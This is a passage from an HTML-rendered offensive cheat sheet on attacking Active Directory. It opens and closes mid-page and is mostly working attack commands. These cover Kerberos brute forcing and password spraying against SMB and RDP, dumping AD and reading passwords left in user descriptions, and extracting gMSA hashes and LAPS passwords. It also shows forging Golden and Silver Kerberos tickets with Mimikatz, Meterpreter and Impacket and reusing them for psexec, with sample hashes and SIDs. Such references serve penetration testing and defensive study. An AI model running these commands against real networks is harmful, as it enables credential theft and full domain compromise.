  <li>SeasonYear : Winter2019*,Spring2020!,Summer2018?</li>
  <li>Default AD password with simple mutations such as number-1, special character iteration (*,?,!,#)</li>
</ul>

<h4 id="kerberos-pre-auth-bruteforcing">Kerberos pre-auth bruteforcing</h4>

<p>Using <code class="language-plaintext highlighter-rouge">kerbrute</code>, a tool to perform Kerberos pre-auth bruteforcing.</p>

<blockquote>
  <p>Kerberos pre-authentication errors are not logged in Active Directory with a normal <strong>Logon failure event (4625)</strong>, but rather with specific logs to <strong>Kerberos pre-authentication failure (4771)</strong>.</p>
</blockquote>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="c"># Username bruteforce</span><span class="w">
</span><span class="n">root</span><span class="err">@</span><span class="nx">kali:~</span><span class="err">$</span><span class="w"> </span><span class="o">.</span><span class="nx">/kerbrute_linux_amd64</span><span class="w"> </span><span class="nx">userenum</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="nx">domain.local</span><span class="w"> </span><span class="nt">--dc</span><span class="w"> </span><span class="nx">10.10.10.10</span><span class="w"> </span><span class="nx">usernames.txt</span><span class="w">

</span><span class="c"># Password brute</span><span class="w">
</span><span class="n">root</span><span class="err">@</span><span class="nx">kali:~</span><span class="err">$</span><span class="w"> </span><span class="o">.</span><span class="nx">/kerbrute_linux_amd64</span><span class="w"> </span><span class="nx">bruteuser</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="nx">domain.local</span><span class="w"> </span><span class="nt">--dc</span><span class="w"> </span><span class="nx">10.10.10.10</span><span class="w"> </span><span class="nx">rockyou.txt</span><span class="w"> </span><span class="nx">username</span><span class="w">

</span><span class="c"># Password spray</span><span class="w">
</span><span class="n">root</span><span class="err">@</span><span class="nx">kali:~</span><span class="err">$</span><span class="w"> </span><span class="o">.</span><span class="nx">/kerbrute_linux_amd64</span><span class="w"> </span><span class="nx">passwordspray</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="nx">domain.local</span><span class="w"> </span><span class="nt">--dc</span><span class="w"> </span><span class="nx">10.10.10.10</span><span class="w"> </span><span class="nx">domain_users.txt</span><span class="w"> </span><span class="nx">Password123</span><span class="w">
</span><span class="n">root</span><span class="err">@</span><span class="nx">kali:~</span><span class="err">$</span><span class="w"> </span><span class="o">.</span><span class="nx">/kerbrute_linux_amd64</span><span class="w"> </span><span class="nx">passwordspray</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="nx">domain.local</span><span class="w"> </span><span class="nt">--dc</span><span class="w"> </span><span class="nx">10.10.10.10</span><span class="w"> </span><span class="nx">domain_users.txt</span><span class="w"> </span><span class="nx">rockyou.txt</span><span class="w">
</span><span class="n">root</span><span class="err">@</span><span class="nx">kali:~</span><span class="err">$</span><span class="w"> </span><span class="o">.</span><span class="nx">/kerbrute_linux_amd64</span><span class="w"> </span><span class="nx">passwordspray</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="nx">domain.local</span><span class="w"> </span><span class="nt">--dc</span><span class="w"> </span><span class="nx">10.10.10.10</span><span class="w"> </span><span class="nx">domain_users.txt</span><span class="w"> </span><span class="s1">'123456'</span><span class="w"> </span><span class="nt">-v</span><span class="w"> </span><span class="nt">--delay</span><span class="w"> </span><span class="nx">100</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nx">kerbrute-passwordspray-123456.log</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h4 id="spray-a-pre-generated-passwords-list">Spray a pre-generated passwords list</h4>

<p>Using <code class="language-plaintext highlighter-rouge">crackmapexec</code> and <code class="language-plaintext highlighter-rouge">mp64</code> to generate passwords and spray them against SMB services on the network.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">crackmapexec</span><span class="w"> </span><span class="nx">smb</span><span class="w"> </span><span class="nx">10.0.0.1/24</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">Administrator</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="se">`(</span><span class="o">.</span><span class="nx">/mp64.bin</span><span class="w"> </span><span class="nx">Pass</span><span class="err">@</span><span class="nx">wor</span><span class="nf">?</span><span class="nx">l</span><span class="nf">?</span><span class="nx">a</span><span class="p">)</span><span class="se">`
</span></pre></td></tr></tbody></table></code></div></div>

<p>Using <code class="language-plaintext highlighter-rouge">DomainPasswordSpray</code> to spray a password against all users of a domain.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="c"># https://github.com/dafthack/DomainPasswordSpray</span><span class="w">
</span><span class="n">Invoke-DomainPasswordSpray</span><span class="w"> </span><span class="nt">-Password</span><span class="w"> </span><span class="nx">Summer2021</span><span class="o">!</span><span class="w">

</span><span class="c"># /!\ be careful with the account lockout !</span><span class="w">
</span><span class="n">Invoke-DomainPasswordSpray</span><span class="w"> </span><span class="nt">-UserList</span><span class="w"> </span><span class="nx">users.txt</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="nx">domain-name</span><span class="w"> </span><span class="nt">-PasswordList</span><span class="w"> </span><span class="nx">passlist.txt</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="nx">sprayed-creds.txt</span><span class="w">

</span></pre></td></tr></tbody></table></code></div></div>

<h4 id="spray-passwords-against-the-rdp-service">Spray passwords against the RDP service</h4>

<p>Using RDPassSpray to target RDP services.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="n">git</span><span class="w"> </span><span class="nx">clone</span><span class="w"> </span><span class="nx">https://github.com/xFreed0m/RDPassSpray</span><span class="w">
</span><span class="n">python3</span><span class="w"> </span><span class="nx">RDPassSpray.py</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="p">[</span><span class="n">USERNAME</span><span class="p">]</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="p">[</span><span class="n">PASSWORD</span><span class="p">]</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="p">[</span><span class="n">DOMAIN</span><span class="p">]</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="p">[</span><span class="n">TARGET</span><span class="w"> </span><span class="n">IP</span><span class="p">]</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Using hydra and ncrack to target RDP services.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="n">hydra</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nt">-V</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nt">-l</span><span class="w"> </span><span class="nx">administrator</span><span class="w"> </span><span class="nt">-P</span><span class="w"> </span><span class="nx">/usr/share/wordlists/rockyou.txt</span><span class="w"> </span><span class="nx">rdp://10.10.10.10</span><span class="w">
</span><span class="n">ncrack</span><span class="w"> </span><span class="err">–</span><span class="nx">connection-limit</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nt">-vv</span><span class="w"> </span><span class="nt">--user</span><span class="w"> </span><span class="nx">administrator</span><span class="w"> </span><span class="nt">-P</span><span class="w"> </span><span class="nx">password-file.txt</span><span class="w"> </span><span class="nx">rdp://10.10.10.10</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h3 id="password-in-ad-user-comment">Password in AD User comment</h3>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="n">enum4linux</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="nt">-i</span><span class="w"> </span><span class="nx">desc</span><span class="w">
</span><span class="n">There</span><span class="w"> </span><span class="nx">are</span><span class="w"> </span><span class="nx">3-4</span><span class="w"> </span><span class="nx">fields</span><span class="w"> </span><span class="nx">that</span><span class="w"> </span><span class="nx">seem</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">be</span><span class="w"> </span><span class="nx">common</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">most</span><span class="w"> </span><span class="nx">AD</span><span class="w"> </span><span class="nx">schemas:</span><span class="w"> 
</span><span class="n">UserPassword</span><span class="p">,</span><span class="w"> </span><span class="nx">UnixUserPassword</span><span class="p">,</span><span class="w"> </span><span class="nx">unicodePwd</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">msSFU30Password.</span><span class="w">

</span><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nt">-Class</span><span class="w"> </span><span class="nx">Win32_UserAccount</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="s2">"Domain='COMPANYDOMAIN' AND Disabled='False'"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="w"> </span><span class="nx">Domain</span><span class="p">,</span><span class="w"> </span><span class="nx">Status</span><span class="p">,</span><span class="w"> </span><span class="nx">LocalAccount</span><span class="p">,</span><span class="w"> </span><span class="nx">AccountType</span><span class="p">,</span><span class="w"> </span><span class="nx">Lockout</span><span class="p">,</span><span class="w"> </span><span class="nx">PasswordRequired</span><span class="p">,</span><span class="nx">PasswordChangeable</span><span class="p">,</span><span class="w"> </span><span class="nx">Description</span><span class="p">,</span><span class="w"> </span><span class="nx">SID</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>
<p>or dump the Active Directory and <code class="language-plaintext highlighter-rouge">grep</code> the content.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">ldapdomaindump</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="s1">'DOMAIN\john'</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">MyP</span><span class="err">@</span><span class="nx">ssW0rd</span><span class="w"> </span><span class="nx">10.10.10.10</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nx">~/Documents/AD_DUMP/</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h3 id="reading-gmsa-password">Reading GMSA Password</h3>

<blockquote>
  <p>User accounts created to be used as service accounts rarely have their password changed. Group Managed Service Accounts (GMSAs) provide a better approach (starting in the Windows 2012 timeframe). The password is managed by AD and automatically changed.</p>
</blockquote>

<h4 id="gmsa-attributes-in-the-active-directory">GMSA Attributes in the Active Directory</h4>
<ul>
  <li><strong>msDS-GroupMSAMembership</strong> (PrincipalsAllowedToRetrieveManagedPassword) - stores the security principals that can access the GMSA password.</li>
  <li><strong>msds-ManagedPassword</strong> - This attribute contains a BLOB with password information for group-managed service accounts.</li>
  <li><strong>msDS-ManagedPasswordId</strong> - This constructed attribute contains the key identifier for the current managed password data for a group MSA.</li>
  <li><strong>msDS-ManagedPasswordInterval</strong> - This attribute is used to retrieve the number of days before a managed password is automatically changed for a group MSA.</li>
</ul>

<h4 id="extract-nt-hash-from-the-active-directory">Extract NT hash from the Active Directory</h4>

<ul>
  <li>GMSAPasswordReader (C#)
    <pre><code class="language-ps1"># https://github.com/rvazarkar/GMSAPasswordReader
GMSAPasswordReader.exe --accountname SVC_SERVICE_ACCOUNT
</code></pre>
  </li>
  <li><a href="https://github.com/micahvandeusen/gMSADumper">gMSADumper (Python)</a>
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="c"># https://github.com/micahvandeusen/gMSADumper</span><span class="w">
</span><span class="n">python3</span><span class="w"> </span><span class="nx">gMSADumper.py</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">User</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">Password1</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="nx">domain.local</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>Active Directory Powershell
    <pre><code class="language-ps1">$gmsa =  Get-ADServiceAccount -Identity 'SVC_SERVICE_ACCOUNT' -Properties 'msDS-ManagedPassword'
$blob = $gmsa.'msDS-ManagedPassword'
$mp = ConvertFrom-ADManagedPasswordBlob $blob
$hash1 =  ConvertTo-NTHash -Password $mp.SecureCurrentPassword
</code></pre>
  </li>
  <li><a href="https://gist.github.com/kdejoyce/f0b8f521c426d04740148d72f5ea3f6f#file-gmsa_permissions_collection-ps1">gMSA_Permissions_Collection.ps1</a> based on Active Directory PowerShell module</li>
</ul>

<h3 id="reading-laps-password">Reading LAPS Password</h3>

<blockquote>
  <p>Use LAPS to automatically manage local administrator passwords on domain joined computers so that passwords are unique on each managed computer, randomly generated, and securely stored in Active Directory infrastructure.</p>
</blockquote>

<h4 id="determine-if-laps-is-installed">Determine if LAPS is installed</h4>

<pre><code class="language-ps1">Get-ChildItem 'c:\program files\LAPS\CSE\Admpwd.dll'
Get-FileHash 'c:\program files\LAPS\CSE\Admpwd.dll'
Get-AuthenticodeSignature 'c:\program files\LAPS\CSE\Admpwd.dll'
</code></pre>

<h4 id="extract-laps-password">Extract LAPS password</h4>

<blockquote>
  <p>The “ms-mcs-AdmPwd” a “confidential” computer attribute that stores the clear-text LAPS password. Confidential attributes can only be viewed by Domain Admins by default, and unlike other attributes, is not accessible by Authenticated Users</p>
</blockquote>

<ul>
  <li>CrackMapExec
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="n">crackmapexec</span><span class="w"> </span><span class="nx">smb</span><span class="w"> </span><span class="nx">10.10.10.10</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nt">-H</span><span class="w"> </span><span class="nx">8846f7eaee8fb117ad06bdd830b7586c</span><span class="w"> </span><span class="nt">-M</span><span class="w"> </span><span class="nx">laps</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>Powerview
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerView.ps1</span><span class="w">
  </span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-DomainComputer</span><span class="w"> </span><span class="nx">COMPUTER</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="nx">ms-mcs-AdmPwd</span><span class="p">,</span><span class="nx">ComputerName</span><span class="p">,</span><span class="nx">ms-mcs-AdmPwdExpirationTime</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>LAPSToolkit - https://github.com/leoloobeek/LAPSToolkit
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="err">$</span><span class="w"> </span><span class="n">Get-LAPSComputers</span><span class="w">
  </span><span class="nx">ComputerName</span><span class="w">                </span><span class="nx">Password</span><span class="w">                                 </span><span class="nx">Expiration</span><span class="w">         
  </span><span class="o">------------</span><span class="w">                </span><span class="o">--------</span><span class="w">                                 </span><span class="o">----------</span><span class="w">         
  </span><span class="n">exmaple.domain.local</span><span class="w">        </span><span class="nx">dbZu7</span><span class="p">;</span><span class="n">vGaI</span><span class="p">)</span><span class="n">Y6w1L</span><span class="w">                         </span><span class="nx">02/21/2021</span><span class="w"> </span><span class="nx">22:29:18</span><span class="w">

  </span><span class="err">$</span><span class="w"> </span><span class="n">Find-LAPSDelegatedGroups</span><span class="w">
  </span><span class="err">$</span><span class="w"> </span><span class="nx">Find-AdmPwdExtendedRights</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>ldapsearch
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="n">ldapsearch</span><span class="w"> </span><span class="nt">-x</span><span class="w"> </span><span class="nt">-h</span><span class="err"> </span><span class="w"> </span><span class="nt">-D</span><span class="w"> </span><span class="s2">"@"</span><span class="w"> </span><span class="nt">-w</span><span class="err"> </span><span class="w"> </span><span class="nt">-b</span><span class="w"> </span><span class="s2">"dc=&lt;&gt;,dc=&lt;&gt;,dc=&lt;&gt;"</span><span class="w"> </span><span class="s2">"(&amp;(objectCategory=computer)(ms-MCS-AdmPwd=*))"</span><span class="w"> </span><span class="nx">ms-MCS-AdmPwd</span><span class="se">`
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>LAPSDumper - https://github.com/n00py/LAPSDumper
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="n">python</span><span class="w"> </span><span class="nx">laps.py</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="nx">domain.local</span><span class="w">
  </span><span class="n">python</span><span class="w"> </span><span class="nx">laps.py</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="nx">domain.local</span><span class="w"> </span><span class="nt">-l</span><span class="w"> </span><span class="nx">dc01.domain.local</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>Powershell AdmPwd.PS
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="kr">foreach</span><span class="w"> </span><span class="p">(</span><span class="nv">$objResult</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$colResults</span><span class="p">){</span><span class="nv">$objComputer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$objResult</span><span class="o">.</span><span class="nf">Properties</span><span class="p">;</span><span class="w"> </span><span class="nv">$objComputer</span><span class="o">.</span><span class="nf">name</span><span class="o">|</span><span class="n">where</span><span class="w"> </span><span class="p">{</span><span class="nv">$objcomputer</span><span class="o">.</span><span class="nf">name</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">computername</span><span class="p">}</span><span class="o">|%</span><span class="p">{</span><span class="n">foreach-object</span><span class="w"> </span><span class="p">{</span><span class="n">Get-AdmPwdPassword</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="bp">$_</span><span class="p">}}}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
</ul>

<h3 id="pass-the-ticket-golden-tickets">Pass-the-Ticket Golden Tickets</h3>

<p>Forging a TGT require the krbtgt NTLM hash</p>

<blockquote>
  <p>The way to forge a Golden Ticket is very similar to the Silver Ticket one. The main differences are that, in this case, no service SPN must be specified to ticketer.py, and the krbtgt ntlm hash must be used.</p>
</blockquote>

<h4 id="using-mimikatz">Using Mimikatz</h4>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="c"># Get info - Mimikatz</span><span class="w">
</span><span class="n">lsadump::lsa</span><span class="w"> </span><span class="nx">/inject</span><span class="w"> </span><span class="nx">/name:krbtgt</span><span class="w">
</span><span class="n">lsadump::lsa</span><span class="w"> </span><span class="nx">/patch</span><span class="w">
</span><span class="n">lsadump::trust</span><span class="w"> </span><span class="nx">/patch</span><span class="w">
</span><span class="n">lsadump::dcsync</span><span class="w"> </span><span class="nx">/user:krbtgt</span><span class="w">

</span><span class="c"># Forge a Golden ticket - Mimikatz</span><span class="w">
</span><span class="n">kerberos::purge</span><span class="w">
</span><span class="nx">kerberos::golden</span><span class="w"> </span><span class="nx">/user:evil</span><span class="w"> </span><span class="nx">/domain:pentestlab.local</span><span class="w"> </span><span class="nx">/sid:S-1-5-21-3737340914-2019594255-2413685307</span><span class="w"> </span><span class="nx">/krbtgt:d125e4f69c851529045ec95ca80fa37e</span><span class="w"> </span><span class="nx">/ticket:evil.tck</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span><span class="n">kerberos::tgt</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h4 id="using-meterpreter">Using Meterpreter</h4>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="c"># Get info - Meterpreter(kiwi)</span><span class="w">
</span><span class="n">dcsync_ntlm</span><span class="w"> </span><span class="nx">krbtgt</span><span class="w">
</span><span class="n">dcsync</span><span class="w"> </span><span class="nx">krbtgt</span><span class="w">

</span><span class="c"># Forge a Golden ticket - Meterpreter</span><span class="w">
</span><span class="n">load</span><span class="w"> </span><span class="nx">kiwi</span><span class="w">
</span><span class="n">golden_ticket_create</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">domainname</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-k</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">nthashof</span><span class="w"> </span><span class="nx">krbtgt</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">SID</span><span class="w"> </span><span class="nx">without</span><span class="w"> </span><span class="nx">le</span><span class="w"> </span><span class="nx">RID</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">user_for_the_ticket</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">location_to_store_tck</span><span class="err">&gt;</span><span class="w">
</span><span class="n">golden_ticket_create</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="nx">pentestlab.local</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">pentestlabuser</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="nx">S-1-5-21-3737340914-2019594255-2413685307</span><span class="w"> </span><span class="nt">-k</span><span class="w"> </span><span class="nx">d125e4f69c851529045ec95ca80fa37e</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">/root/Downloads/pentestlabuser.tck</span><span class="w">
</span><span class="n">kerberos_ticket_purge</span><span class="w">
</span><span class="nx">kerberos_ticket_use</span><span class="w"> </span><span class="nx">/root/Downloads/pentestlabuser.tck</span><span class="w">
</span><span class="n">kerberos_ticket_list</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h4 id="using-a-ticket-on-linux">Using a ticket on Linux</h4>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="c"># Convert the ticket kirbi to ccache with kekeo</span><span class="w">
</span><span class="n">misc::convert</span><span class="w"> </span><span class="nx">ccache</span><span class="w"> </span><span class="nx">ticket.kirbi</span><span class="w">

</span><span class="c"># Alternatively you can use ticketer from Impacket</span><span class="w">
</span><span class="o">.</span><span class="n">/ticketer.py</span><span class="w"> </span><span class="nt">-nthash</span><span class="w"> </span><span class="nx">a577fcf16cfef780a2ceb343ec39a0d9</span><span class="w"> </span><span class="nt">-domain-sid</span><span class="w"> </span><span class="nx">S-1-5-21-2972629792-1506071460-1188933728</span><span class="w"> </span><span class="nt">-domain</span><span class="w"> </span><span class="nx">amity.local</span><span class="w"> </span><span class="nx">mbrody-da</span><span class="w">

</span><span class="n">ticketer.py</span><span class="w"> </span><span class="nt">-nthash</span><span class="w"> </span><span class="nx">HASHKRBTGT</span><span class="w"> </span><span class="nt">-domain-sid</span><span class="w"> </span><span class="nx">SID_DOMAIN_A</span><span class="w"> </span><span class="nt">-domain</span><span class="w"> </span><span class="nx">DEV</span><span class="w"> </span><span class="nx">Administrator</span><span class="w"> </span><span class="nt">-extra-sid</span><span class="w"> </span><span class="nx">SID_DOMAIN_B_ENTERPRISE_519</span><span class="w">
</span><span class="o">.</span><span class="n">/ticketer.py</span><span class="w"> </span><span class="nt">-nthash</span><span class="w"> </span><span class="nx">e65b41757ea496c2c60e82c05ba8b373</span><span class="w"> </span><span class="nt">-domain-sid</span><span class="w"> </span><span class="nx">S-1-5-21-354401377-2576014548-1758765946</span><span class="w"> </span><span class="nt">-domain</span><span class="w"> </span><span class="nx">DEV</span><span class="w"> </span><span class="nx">Administrator</span><span class="w"> </span><span class="nt">-extra-sid</span><span class="w"> </span><span class="nx">S-1-5-21-2992845451-2057077057-2526624608-519</span><span class="w">

</span><span class="n">export</span><span class="w"> </span><span class="nx">KRB5CCNAME</span><span class="o">=</span><span class="n">/home/user/ticket.ccache</span><span class="w">
</span><span class="nx">cat</span><span class="w"> </span><span class="nv">$KRB5CCNAME</span><span class="w">

</span><span class="c"># NOTE: You may need to comment the proxy_dns setting in the proxychains configuration file</span><span class="w">
</span><span class="o">.</span><span class="n">/psexec.py</span><span class="w"> </span><span class="nt">-k</span><span class="w"> </span><span class="nt">-no-pass</span><span class="w"> </span><span class="nt">-dc-ip</span><span class="w"> </span><span class="nx">192.168.1.1</span><span class="w"> </span><span class="nx">AD/administrator</span><span class="err">@</span><span class="nx">192.168.1.100</span><span class="w"> 
</span></pre></td></tr></tbody></table></code></div></div>

<p>If you need to swap ticket between Windows and Linux, you need to convert them with <code class="language-plaintext highlighter-rouge">ticket_converter</code> or <code class="language-plaintext highlighter-rouge">kekeo</code>.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="n">root</span><span class="err">@</span><span class="nx">kali:ticket_converter</span><span class="err">$</span><span class="w"> </span><span class="nx">python</span><span class="w"> </span><span class="nx">ticket_converter.py</span><span class="w"> </span><span class="nx">velociraptor.ccache</span><span class="w"> </span><span class="nx">velociraptor.kirbi</span><span class="w">
</span><span class="n">Converting</span><span class="w"> </span><span class="nx">ccache</span><span class="w"> </span><span class="o">=</span><span class="err">&gt;</span><span class="w"> </span><span class="n">kirbi</span><span class="w">
</span><span class="nx">root</span><span class="err">@</span><span class="nx">kali:ticket_converter</span><span class="err">$</span><span class="w"> </span><span class="nx">python</span><span class="w"> </span><span class="nx">ticket_converter.py</span><span class="w"> </span><span class="nx">velociraptor.kirbi</span><span class="w"> </span><span class="nx">velociraptor.ccache</span><span class="w">
</span><span class="n">Converting</span><span class="w"> </span><span class="nx">kirbi</span><span class="w"> </span><span class="o">=</span><span class="err">&gt;</span><span class="w"> </span><span class="n">ccache</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Mitigations:</p>
<ul>
  <li>Hard to detect because they are legit TGT tickets</li>
  <li>Mimikatz generate a golden ticket with a life-span of 10 years</li>
</ul>

<h3 id="pass-the-ticket-silver-tickets">Pass-the-Ticket Silver Tickets</h3>

<p>Forging a TGS require machine account password (key) or NTLM hash of the service account.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre><span class="c"># Create a ticket for the service</span><span class="w">
</span><span class="n">mimikatz</span><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="nx">kerberos::golden</span><span class="w"> </span><span class="nx">/user:USERNAME</span><span class="w"> </span><span class="nx">/domain:DOMAIN.FQDN</span><span class="w"> </span><span class="nx">/sid:DOMAIN-SID</span><span class="w"> </span><span class="nx">/target:TARGET-HOST.DOMAIN.FQDN</span><span class="w"> </span><span class="nx">/rc4:TARGET-MACHINE-NT-HASH</span><span class="w"> </span><span class="nx">/service:SERVICE</span><span class="w">

</span><span class="c"># Examples</span><span class="w">
